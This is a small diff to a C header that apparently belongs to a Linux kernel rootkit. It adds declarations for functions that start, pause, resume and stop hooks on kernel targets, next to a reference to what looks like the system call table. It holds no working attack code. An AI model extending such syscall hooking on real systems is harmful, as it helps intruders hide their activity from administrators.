@@ -63,6 +63,11 @@ struct linux_dirent64
 
 extern unsigned long *sct;
 
+void hook_start(void *target, void *new);
+void hook_pause(void *target);
+void hook_resume(void *target);
+void hook_stop(void *target);
+
 char *strnstr(const char *haystack, const char *needle, size_t n);
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
 void *memstr(const void *haystack, const char *needle, size_t size);
